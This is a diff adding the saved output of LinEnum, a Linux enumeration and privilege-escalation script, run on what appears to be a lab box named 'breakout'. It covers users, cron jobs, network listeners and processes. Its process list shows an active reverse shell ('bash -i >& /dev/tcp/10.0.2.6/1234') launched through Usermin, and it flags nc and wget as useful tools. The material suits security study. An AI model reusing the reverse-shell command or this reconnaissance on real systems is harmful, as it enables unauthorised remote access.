@@ -1,0 +1,483 @@
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# 
+
+Debug Info
+thorough tests = disabled
+
+
+Scan started at:
+Tue 23 Jul 2024 03:45:26 AM EDT                                                                                            
+                                                                                                                           
+
+### SYSTEM ##############################################
+Kernel information:
+Linux breakout 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux
+
+
+Kernel information (continued):
+Linux version 5.10.0-9-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.70-1 (2021-09-30)
+
+
+Specific release information:
+PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
+NAME="Debian GNU/Linux"
+VERSION_ID="11"
+VERSION="11 (bullseye)"
+VERSION_CODENAME=bullseye
+ID=debian
+HOME_URL="https://www.debian.org/"
+SUPPORT_URL="https://www.debian.org/support"
+BUG_REPORT_URL="https://bugs.debian.org/"
+
+
+Hostname:
+breakout
+
+
+### USER/GROUP ##########################################
+Current user/group info:
+uid=1000(cyber) gid=1000(cyber) groups=1000(cyber),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+
+
+Users that have previously logged onto the system:
+Username         Port     From             Latest
+root             tty1                      Wed Oct 20 07:48:35 -0400 2021
+cyber            tty1                      Tue Jul 23 02:51:13 -0400 2024
+
+
+All users and uid/gid info:
+root:x:0:0
+daemon:x:1:1
+bin:x:2:2
+sys:x:3:3
+sync:x:4:65534
+games:x:5:60
+man:x:6:12
+lp:x:7:7
+mail:x:8:8
+news:x:9:9
+uucp:x:10:10
+proxy:x:13:13
+www-data:x:33:33
+backup:x:34:34
+list:x:38:38
+irc:x:39:39
+gnats:x:41:41
+nobody:x:65534:65534
+_apt:x:100:65534
+systemd-timesync:x:101:101
+systemd-network:x:102:103
+systemd-resolve:x:103:104
+messagebus:x:104:110
+cyber:x:1000:1000
+systemd-coredump:x:999:999
+
+
+Group memberships:
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=101(systemd-timesync) gid=101(systemd-timesync) groups=101(systemd-timesync)
+uid=102(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
+uid=103(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
+uid=104(messagebus) gid=110(messagebus) groups=110(messagebus)
+uid=1000(cyber) gid=1000(cyber) groups=1000(cyber),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
+
+
+Sample entires from /etc/passwd (searching for uid values 0, 500, 501, 502, 1000, 1001, 1002, 2000, 2001, 2002):
+root:x:0:0:root:/root:/bin/bash
+cyber:x:1000:1000:cyber,,,:/home/cyber:/bin/bash
+
+
+Super user account(s):
+root
+
+
+Are permissions on /home directories lax:
+total 12K
+drwxr-xr-x  3 root  root  4.0K Oct 19  2021 .
+drwxr-xr-x 18 root  root  4.0K Oct 19  2021 ..
+drwxr-xr-x  8 cyber cyber 4.0K Jul 23 03:44 cyber
+
+
+### ENVIRONMENTAL #######################################
+Path information:
+/bin:/usr/bin:/sbin:/usr/sbin:/usr/local/bin
+
+
+Available shells:
+# /etc/shells: valid login shells
+/bin/sh
+/bin/bash
+/usr/bin/bash
+/bin/rbash
+/usr/bin/rbash
+/bin/dash
+/usr/bin/dash
+
+
+Current umask value:
+0022
+u=rwx,g=rx,o=rx
+
+
+umask value as specified in /etc/login.defs:
+UMASK           022
+
+
+Password and storage information:
+PASS_MAX_DAYS   99999
+PASS_MIN_DAYS   0
+PASS_WARN_AGE   7
+ENCRYPT_METHOD SHA512
+
+
+### JOBS/TASKS ##########################################
+Cron jobs:
+-rw-r--r-- 1 root root 1042 Feb 22  2021 /etc/crontab
+
+/etc/cron.d:
+total 16
+drwxr-xr-x  2 root root 4096 Oct 19  2021 .
+drwxr-xr-x 73 root root 4096 Jul 23 03:41 ..
+-rw-r--r--  1 root root  201 Jun  7  2021 e2scrub_all
+-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder
+
+/etc/cron.daily:
+total 36
+drwxr-xr-x  2 root root 4096 Oct 19  2021 .
+drwxr-xr-x 73 root root 4096 Jul 23 03:41 ..
+-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2
+-rwxr-xr-x  1 root root 1478 Jun 10  2021 apt-compat
+-rwxr-xr-x  1 root root 1298 Jan 30  2021 dpkg
+-rwxr-xr-x  1 root root  377 Feb 28  2021 logrotate
+-rwxr-xr-x  1 root root 1123 Feb 19  2021 man-db
+-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder
+-rwxr-xr-x  1 root root  383 May  6  2021 samba
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Oct 19  2021 .
+drwxr-xr-x 73 root root 4096 Jul 23 03:41 ..
+-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Oct 19  2021 .
+drwxr-xr-x 73 root root 4096 Jul 23 03:41 ..
+-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder
+
+/etc/cron.weekly:
+total 16
+drwxr-xr-x  2 root root 4096 Oct 19  2021 .
+drwxr-xr-x 73 root root 4096 Jul 23 03:41 ..
+-rwxr-xr-x  1 root root  813 Feb 19  2021 man-db
+-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder
+
+
+Crontab contents:
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+
+### NETWORKING  ##########################################
+Network & IP info:
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.9  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef9:52fc  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f9:52:fc  txqueuelen 1000  (Ethernet)
+        RX packets 13352  bytes 2316364 (2.2 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 14637  bytes 3608884 (3.4 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 174  bytes 10100 (9.8 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 174  bytes 10100 (9.8 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+Nameserver(s):
+nameserver 192.168.1.1
+
+
+Default route:
+default         10.0.2.1        0.0.0.0         UG    0      0        0 eth0
+
+
+Listening TCP:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:20000           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
+tcp        0      0 10.0.2.9:20000          10.0.2.6:33078          ESTABLISHED -                   
+tcp        0      0 10.0.2.9:54488          10.0.2.6:1234           ESTABLISHED 1799/bash           
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::445                  :::*                    LISTEN      -                   
+tcp6       0      0 :::139                  :::*                    LISTEN      -                   
+
+
+Listening UDP:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+udp        0      0 0.0.0.0:20000           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:10000           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
+udp        0      0 10.0.2.255:137          0.0.0.0:*                           -                   
+udp        0      0 10.0.2.9:137            0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:137             0.0.0.0:*                           -                   
+udp        0      0 10.0.2.255:138          0.0.0.0:*                           -                   
+udp        0      0 10.0.2.9:138            0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:138             0.0.0.0:*                           -                   
+
+
+### SERVICES #############################################
+Running processes:
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.5  98184 10224 ?        Ss   01:13   0:04 /sbin/init
+root           2  0.0  0.0      0     0 ?        S    01:13   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I<   01:13   0:00 [rcu_gp]
+root           4  0.0  0.0      0     0 ?        I<   01:13   0:00 [rcu_par_gp]
+root           6  0.0  0.0      0     0 ?        I<   01:13   0:00 [kworker/0:0H-events_highpri]
+root           9  0.0  0.0      0     0 ?        I<   01:13   0:00 [mm_percpu_wq]
+root          10  0.0  0.0      0     0 ?        S    01:13   0:00 [rcu_tasks_rude_]
+root          11  0.0  0.0      0     0 ?        S    01:13   0:00 [rcu_tasks_trace]
+root          12  0.0  0.0      0     0 ?        S    01:13   0:04 [ksoftirqd/0]
+root          13  0.0  0.0      0     0 ?        I    01:13   0:00 [rcu_sched]
+root          14  0.0  0.0      0     0 ?        S    01:13   0:00 [migration/0]
+root          15  0.0  0.0      0     0 ?        S    01:13   0:00 [cpuhp/0]
+root          17  0.0  0.0      0     0 ?        S    01:13   0:00 [kdevtmpfs]
+root          18  0.0  0.0      0     0 ?        I<   01:13   0:00 [netns]
+root          19  0.0  0.0      0     0 ?        S    01:13   0:00 [kauditd]
+root          20  0.0  0.0      0     0 ?        S    01:13   0:00 [khungtaskd]
+root          21  0.0  0.0      0     0 ?        S    01:13   0:00 [oom_reaper]
+root          22  0.0  0.0      0     0 ?        I<   01:13   0:00 [writeback]
+root          23  0.0  0.0      0     0 ?        S    01:13   0:01 [kcompactd0]
+root          24  0.0  0.0      0     0 ?        SN   01:13   0:00 [ksmd]
+root          25  0.0  0.0      0     0 ?        SN   01:13   0:00 [khugepaged]
+root          43  0.0  0.0      0     0 ?        I<   01:13   0:00 [kintegrityd]
+root          44  0.0  0.0      0     0 ?        I<   01:13   0:00 [kblockd]
+root          45  0.0  0.0      0     0 ?        I<   01:13   0:00 [blkcg_punt_bio]
+root          46  0.0  0.0      0     0 ?        I<   01:13   0:00 [edac-poller]
+root          47  0.0  0.0      0     0 ?        I<   01:13   0:00 [devfreq_wq]
+root          48  0.0  0.0      0     0 ?        I<   01:13   0:04 [kworker/0:1H-kblockd]
+root          51  0.0  0.0      0     0 ?        S    01:13   0:00 [kswapd0]
+root          52  0.0  0.0      0     0 ?        I<   01:13   0:00 [kthrotld]
+root          53  0.0  0.0      0     0 ?        I<   01:13   0:00 [acpi_thermal_pm]
+root          54  0.0  0.0      0     0 ?        I<   01:13   0:00 [ipv6_addrconf]
+root          64  0.0  0.0      0     0 ?        I<   01:13   0:00 [kstrp]
+root          67  0.0  0.0      0     0 ?        I<   01:13   0:00 [zswap-shrink]
+root          68  0.0  0.0      0     0 ?        I<   01:13   0:00 [kworker/u3:0]
+root         110  0.0  0.0      0     0 ?        I<   01:13   0:00 [ata_sff]
+root         111  0.0  0.0      0     0 ?        I<   01:13   0:00 [mpt_poll_0]
+root         112  0.0  0.0      0     0 ?        I<   01:13   0:00 [mpt/0]
+root         113  0.0  0.0      0     0 ?        S    01:13   0:00 [scsi_eh_0]
+root         114  0.0  0.0      0     0 ?        I<   01:13   0:00 [scsi_tmf_0]
+root         115  0.0  0.0      0     0 ?        S    01:13   0:00 [scsi_eh_1]
+root         116  0.0  0.0      0     0 ?        I<   01:13   0:00 [scsi_tmf_1]
+root         119  0.0  0.0      0     0 ?        S    01:13   0:00 [scsi_eh_2]
+root         120  0.0  0.0      0     0 ?        I<   01:13   0:00 [scsi_tmf_2]
+root         151  0.0  0.0      0     0 ?        S    01:13   0:00 [jbd2/sda1-8]
+root         152  0.0  0.0      0     0 ?        I<   01:13   0:00 [ext4-rsv-conver]
+root         186  0.0  0.7  48396 16068 ?        Ss   01:13   0:01 /lib/systemd/systemd-journald
+root         209  0.0  0.2  21508  5240 ?        Ss   01:13   0:00 /lib/systemd/systemd-udevd
+root         243  0.0  0.0      0     0 ?        I<   01:13   0:00 [cryptd]
+systemd+     253  0.0  0.2  88376  6032 ?        Ssl  01:13   0:00 /lib/systemd/systemd-timesyncd
+root         263  0.0  0.0      0     0 ?        I<   01:13   0:00 [ttm_swap]
+root         323  0.0  0.1   6684  2828 ?        Ss   01:14   0:00 /usr/sbin/cron -f
+message+     325  0.0  0.2   8192  4156 ?        Ss   01:14   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root         326  0.0  0.2  99824  6072 ?        Ssl  01:14   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
+root         330  0.0  0.3 220740  6128 ?        Ssl  01:14   0:00 /usr/sbin/rsyslogd -n -iNONE
+root         333  0.0  0.3  22116  7064 ?        Ss   01:14   0:00 /lib/systemd/systemd-logind
+root         364  0.0  0.7  68388 16088 ?        Ss   01:14   0:01 /usr/sbin/nmbd --foreground --no-process-group
+root         418  0.0  0.2   6636  4840 ?        Ss   01:14   0:02 /usr/sbin/apache2 -k start
+www-data     428  0.0  0.5 752788 10672 ?        Sl   01:14   0:00 /usr/sbin/apache2 -k start
+www-data     429  0.0  0.5 752756 10672 ?        Sl   01:14   0:00 /usr/sbin/apache2 -k start
+root         536  0.0  1.1  31088 23112 ?        Ss   01:14   0:02 /usr/bin/perl /usr/share/usermin/miniserv.pl /etc/usermin/miniserv.conf
+root         538  0.0  1.4  36688 28696 ?        Ss   01:14   0:02 /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
+root         545  0.0  1.2  82652 25176 ?        Ss   01:14   0:01 /usr/sbin/smbd --foreground --no-process-group
+root         559  0.0  0.5  80352 10328 ?        S    01:14   0:00 /usr/sbin/smbd --foreground --no-process-group
+root         560  0.0  0.4  80360  8256 ?        S    01:14   0:00 /usr/sbin/smbd --foreground --no-process-group
+root         563  0.0  0.5  82636 11332 ?        S    01:14   0:00 /usr/sbin/smbd --foreground --no-process-group
+root        1654  2.2  0.0      0     0 ?        I    02:13   2:06 [kworker/0:0-events]
+cyber       1727  0.0  0.4  15112  8560 ?        Ss   02:15   0:00 /lib/systemd/systemd --user
+cyber       1728  0.0  0.1 101136  2632 ?        S    02:15   0:00 (sd-pam)
+root        1795  0.0  1.4  34904 29716 ?        S    02:25   0:00 /usr/share/usermin/shell/index.cgi
+root        1796  0.0  0.0   2420   572 ?        S    02:25   0:00 sh -c /bin/su cyber -c cd\ \/home\/cyber\ \&\&\ bash\ \-i\ \>\&\ \/dev\/tcp\/10\.0\.2\.6\/1234\ 0\>\&1 2>&1
+root        1797  0.0  0.2   6976  4104 ?        S    02:25   0:00 /bin/su cyber -c cd /home/cyber && bash -i >& /dev/tcp/10.0.2.6/1234 0>&1
+cyber       1798  0.0  0.1   6756  3104 ?        Ss   02:25   0:00 bash -c cd /home/cyber && bash -i >& /dev/tcp/10.0.2.6/1234 0>&1
+cyber       1799  0.0  0.2   7792  4732 ?        S    02:25   0:00 bash -i
+root        1942  0.0  0.2   7116  4348 tty1     Ss   02:50   0:00 /bin/login -p --
+cyber       1947  0.0  0.2   8484  5464 tty1     S+   02:51   0:00 -bash
+root        1952  0.0  0.0      0     0 ?        I    02:51   0:00 [kworker/0:2]
+root        2057  0.0  0.0      0     0 ?        I    03:14   0:00 [kworker/u2:2-flush-8:0]
+root        2161  0.0  0.0      0     0 ?        I    03:33   0:00 [kworker/u2:0-flush-8:0]
+root        2189  0.0  0.0      0     0 ?        I    03:38   0:00 [kworker/u2:3-flush-8:0]
+cyber       2223  2.3  0.1   6884  3476 ?        S    03:45   0:00 /bin/bash ./linuxenum.sh
+cyber       2496  0.0  0.0   6884  1808 ?        S    03:45   0:00 /bin/bash ./linuxenum.sh
+cyber       2497  0.0  0.1   9700  3424 ?        R    03:45   0:00 ps aux
+
+
+Process binaries & associated permissions (from above list):
+1.2M -rwxr-xr-x 1 root root 1.2M Aug  4  2021 /bin/bash
+ 56K -rwxr-xr-x 1 root root  56K Feb  7  2020 /bin/login
+ 72K -rwsr-xr-x 1 root root  71K Jul 28  2021 /bin/su
+1.7M -rwxr-xr-x 1 root root 1.7M Jul 13  2021 /lib/systemd/systemd
+152K -rwxr-xr-x 1 root root 151K Jul 13  2021 /lib/systemd/systemd-journald
+260K -rwxr-xr-x 1 root root 259K Jul 13  2021 /lib/systemd/systemd-logind
+ 56K -rwxr-xr-x 1 root root  55K Jul 13  2021 /lib/systemd/systemd-timesyncd
+   0 lrwxrwxrwx 1 root root   12 Jul 13  2021 /lib/systemd/systemd-udevd -> /bin/udevadm
+508K -rwxr-xr-x 1 root root 505K May 27  2021 /sbin/dhclient
+   0 lrwxrwxrwx 1 root root   20 Jul 13  2021 /sbin/init -> /lib/systemd/systemd
+240K -rwxr-xr-x 1 root root 240K Feb 21  2021 /usr/bin/dbus-daemon
+3.6M -rwxr-xr-x 2 root root 3.6M Sep 24  2021 /usr/bin/perl
+716K -rwxr-xr-x 1 root root 713K Oct  7  2021 /usr/sbin/apache2
+ 56K -rwxr-xr-x 1 root root  55K Feb 22  2021 /usr/sbin/cron
+252K -rwxr-xr-x 1 root root 251K May  6  2021 /usr/sbin/nmbd
+708K -rwxr-xr-x 1 root root 707K Feb 17  2021 /usr/sbin/rsyslogd
+100K -rwxr-xr-x 1 root root  99K May  6  2021 /usr/sbin/smbd
+8.0K -rwxr-xr-x 1 root root 5.6K Aug 28  2021 /usr/share/usermin/shell/index.cgi
+
+
+/etc/init.d/ binary permissions:
+total 96
+drwxr-xr-x  2 root root 4096 Oct 19  2021 .
+drwxr-xr-x 73 root root 4096 Jul 23 03:41 ..
+-rwxr-xr-x  1 root root 8181 Aug  8  2020 apache2
+-rwxr-xr-x  1 root root 2489 Aug  8  2020 apache-htcacheclean
+-rwxr-xr-x  1 root root 3740 Apr  3  2021 apparmor
+-rwxr-xr-x  1 root root 1232 Jul 23  2021 console-setup.sh
+-rwxr-xr-x  1 root root 3059 Feb 22  2021 cron
+-rwxr-xr-x  1 root root 3152 Feb 21  2021 dbus
+-rwxr-xr-x  1 root root 1748 Jul 28  2021 hwclock.sh
+-rwxr-xr-x  1 root root 1479 Oct 29  2018 keyboard-setup.sh
+-rwxr-xr-x  1 root root 2044 Jan  7  2021 kmod
+-rwxr-xr-x  1 root root 4486 Sep 21  2020 networking
+-rwxr-xr-x  1 root root 1934 May  6  2021 nmbd
+-rwxr-xr-x  1 root root 1846 Feb 25  2021 open-vm-tools
+-rwxr-xr-x  1 root root  924 Apr  6  2021 procps
+-rwxr-xr-x  1 root root 2864 Feb 17  2021 rsyslog
+-rwxr-xr-x  1 root root 2259 May  6  2021 samba-ad-dc
+-rwxr-xr-x  1 root root 2061 May  6  2021 smbd
+-rwxr-xr-x  1 root root 6871 Jul 13  2021 udev
+-rwxr-xr-x  1 root root 1800 Aug 28  2021 usermin
+-rwxr-xr-x  1 root root 1858 Aug 28  2021 webmin
+
+
+### SOFTWARE #############################################
+Apache version:
+Server version: Apache/2.4.51 (Debian)
+Server built:   2021-10-07T17:49:44
+
+
+Apache user configuration:
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+
+
+### INTERESTING FILES ####################################
+Useful file locations:
+/bin/nc
+/bin/netcat
+/bin/wget
+
+
+Can we read/write sensitive files:
+-rw-r--r-- 1 root root 1345 Oct 19  2021 /etc/passwd
+-rw-r--r-- 1 root root 754 Oct 19  2021 /etc/group
+-rw-r--r-- 1 root root 769 Apr 10  2021 /etc/profile
+-rw-r----- 1 root shadow 848 Oct 19  2021 /etc/shadow
+
+
+Can't search *.conf files as no keyword was entered
+
+Can't search *.log files as no keyword was entered
+
+Can't search *.ini files as no keyword was entered
+
+All *.conf files in /etc (recursive 1 level):
+-rw-r--r-- 1 root root 5662 Oct 19  2021 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 642 Dec 24  2020 /etc/xattr.conf
+-rw-r--r-- 1 root root 2981 Oct 19  2021 /etc/adduser.conf
+-rw-r--r-- 1 root root 346 Jan 14  2018 /etc/discover-modprobe.conf
+-rw-r--r-- 1 root root 144 Oct 19  2021 /etc/kernel-img.conf
+-rw-r--r-- 1 root root 510 Oct 19  2021 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 1974 Feb 17  2021 /etc/rsyslog.conf
+-rwxr-xr-x 1 root root 228 Jul 20  2021 /etc/nftables.conf
+-rw-r--r-- 1 root root 59 Jul 23 03:41 /etc/resolv.conf
+-rw-r--r-- 1 root root 685 Jun  7  2021 /etc/e2scrub.conf
+-rw-r--r-- 1 root root 2355 Apr  6  2021 /etc/sysctl.conf
+-rw-r--r-- 1 root root 552 Jan 30  2021 /etc/pam.conf
+-rw-r--r-- 1 root root 9 Aug  7  2006 /etc/host.conf
+-rw-r--r-- 1 root root 604 Jun 26  2016 /etc/deluser.conf
+-rw-r--r-- 1 root root 191 Jan  6  2021 /etc/libaudit.conf
+-rw-r--r-- 1 root root 3281 Sep  6  2021 /etc/reportbug.conf
+-rw-r--r-- 1 root root 2969 Jun 10  2021 /etc/debconf.conf
+-rw-r--r-- 1 root root 34 Jul 29  2019 /etc/ld.so.conf
+-rw-r--r-- 1 root root 1260 Jun 16  2020 /etc/ucf.conf
+-rw-r--r-- 1 root root 2584 Feb  1  2020 /etc/gai.conf
+-rw-r--r-- 1 root root 494 Feb 28  2021 /etc/logrotate.conf
+-rw-r--r-- 1 root root 812 Jun  7  2021 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
+
+
+Current user's history files:
+-rw------- 1 cyber cyber   0 Oct 20  2021 /home/cyber/.bash_history
+-rw------- 1 cyber cyber 356 Jul 23 03:29 /home/cyber/.python_history
+
+
+Any interesting mail in /var/mail:
+total 8
+drwxrwsr-x  2 root mail 4096 Oct 19  2021 .
+drwxr-xr-x 14 root root 4096 Oct 19  2021 ..
+
+
+### SCAN COMPLETE ####################################
+
